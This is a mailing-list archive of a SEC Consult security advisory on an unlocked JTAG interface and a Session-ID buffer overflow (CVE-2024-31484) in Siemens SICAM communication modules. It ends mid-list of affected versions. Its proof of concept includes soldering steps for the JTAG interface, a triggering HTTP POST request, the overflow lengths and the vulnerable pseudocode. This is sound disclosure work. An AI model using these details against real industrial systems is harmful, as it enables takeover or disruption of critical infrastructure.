---
title: SEC Consult SA-20241125-0 :: Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element, Siemens CP-2016 & CP-2019
url: https://seclists.org/fulldisclosure/2024/Nov/18
source: Full Disclosure
date: 2024-11-28
fetch_date: 2025-10-06T19:21:44.379506
---

# SEC Consult SA-20241125-0 :: Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element, Siemens CP-2016 & CP-2019

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20241125-0 :: Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element, Siemens CP-2016 & CP-2019

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 25 Nov 2024 08:32:17 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20241125-0 >
=======================================================================
              title: Unlocked JTAG interface and buffer overflow
            product: Siemens SM-2558 Protocol Element (extension module for
                     Siemens SICAM AK3/TM/BC),
                     Siemens CP-2016 & CP-2019
 vulnerable version: JTAG: Unknown HW revision, Zynq Firmware Version 10A45
                     Buffer overflow: <V10.46 (ETA4), <V03.27 (ETA5),
                     <V06.02 (CPCX26), <V06.05 (PCCX26)
      fixed version: JTAG: SM-2558 hardware is EOL
                     Buffer overflow: V06.02 (CPCX26), V10.46 (ETA4),
                     V03.27 (ETA5), V06.05 (PCCX26)
             impact: High
           homepage: https://www.siemens.com
              found: 2023-07-11
                 by: Stefan Viehböck (Office Linz)
                     Constantin Schieber-Knöbl (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Eviden business
                     Europe | Asia

                     https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"We are a technology company focused on industry, infrastructure,
transport, and healthcare. From more resource-efficient factories,
resilient supply chains, and smarter buildings and grids, to cleaner
and more comfortable transportation as well as advanced healthcare,
we create technology with purpose adding real value for customers."

Source: https://new.siemens.com/global/en/company/about.html

Business recommendation:
------------------------
Upgrade to the latest firmware version to mitigate the buffer overflow.

The hardware (SM-2558) is considered end of life (EOL), thus no new
version with a fixed JTAG will be released. Restrict physical access
to the device.

SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.

Vulnerability overview/description:
-----------------------------------
1) Unlocked JTAG Interface of Zynq-7000 on SM-2558
The JTAG interface can be accessed with physical access to the PCB.
After slightly modifying the hardware it is possible to connect to
the interface with full access to the communication module.

2) Buffer Overflow on the Webserver of the SM-2558, CP-2016 & CP-2019 (CVE-2024-31484)
The webserver running on the SM-2558 device as well as CP-2016 and CP-2019
is vulnerable to a buffer overflow vulnerability.

The value of the HTTP header "Session-ID" is processed and used in an
"sprintf" call without proper length checking. The target buffer is in the
BSS segment and likely 1024 bytes in length. The buffer overflows into several
other global data structures.

Proof of concept:
-----------------
1) Unlocked JTAG Interface of Zynq-7000 on SM-2558
The JTAG interface pins (TDI, TDO, TCK, TMS, GND) are accessible on a populated
20-pin header on the PCB (see [figure_1]).

A removed connection needs to be restored by soldering an additional wire
between two exposed contacts (see [figure_2]), as the JTAG interface of the
Zynq-7000 is daisy-chained with the JTAG interface of the Broadcom BCM53101M
Ethernet controller. The pad in question connects to pin A57 (TDI) of the Ethernet
controller. After connecting to the pins, a connection to the Zynq-7000 JTAG
interface is possible. E.g., memory can be dumped ([figure_5]), execution can be
single stepped  ([figure_4]) or halted ([figure_3]), and variables changed.
This grants an attacker with physical access full control of the communication
module.

2) Buffer Overflow on the Webserver of the SM-2558, CP-2016 & CP-2019 (CVE-2024-31484)
The vulnerability can be triggered with a HTTP POST request similar to the
following one:

POST /SICAM_TOOLBOX_1703_remote_connection_01.htm HTTP/1.1
User-Agent: SICAM TOOLBOX II
Version: 1
Session-ID: 3814280BA9922f30_BOF_PAYLOAD_HERE
Sequence-ID: 525
Content-Length: 54
Content-Type: text/plain
KeepAlive: 5
Connection: close

type=1&length=15&data=0780640202fef1e60000feff0100c2

Here are a few observations with different Session-ID values:

a) Session ID value 3814280BA9922f30 results in normal behavior
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd0
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8

type=4

b) Session ID value 3814280BA992fd00000000000000 results in normal behavior
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd00000000000000
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 0

c) Session ID value 3814280BA992fd00000000000000... (in total 618 characters) results in three HTTP responses
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd000000HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd000000HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8

type=4

d) Session ID value 3814280BA992fd00000000000000... (in total 1260 characters) results in a HTTP 500 - internal server
error
HTTP/1.1 500 Internal Server Error
Content-Type: text/html
Content-Length: 198

<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>Sorry, an unexpected internal server
error occurred while processing your request.</p></body></html>

Pseudocode of vulnerable function:
[...]
    sessiond_id = (char *)get_http_header(a1, (int)"Session-ID"); <<<<<<<<<<<<<<<< session_id is extracted from HTTP
request
    if ( !sessiond_id )
      goto LABEL_194;
    if ( unk_51CD1C )
    {
      v11 = 0;
    }
    else
    {
      sub_3DB0E4((unsigned int)byte_51CD08, (unsigned int)sessiond_id, 0x14u);
      v11 = 1;
    }
    if ( sub_15332C() == 1 )
    {
      v134 = 0;
      if ( sub_155BC4(a1, (int)v133) || !v134 )
      {
LABEL_49:
        sequence_id = get_http_header_int(a1, "Sequence-ID");
        sprintf(                      <<<<<<<<<<<<<<<< response_buffer overflows here
          response_buffer,
          "HTTP/1.1 200 OK\r\n"
          "Server: %s\r\n"
          "Version: %u\r\n"
          "Session-ID: %s\r\n"
          "Sequence-ID: %lu\r\n"
          "Content-Type: text/plain\r\n"
          "Content-Length: 0\r\n"
          "\r\n",
          "SICAM 1703",
          1,
          sessiond_id,
          sequence_id);
[...]

Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:
- Webserver that runs on Firmware Version 10A45 of the Zynq FPGA.
- The Hardware revision of the device was unknown.

According to the vendor, the following firmware versions for the SM-2558
are affected by CVE-2024-31484:
* ETA4 Ethernet I...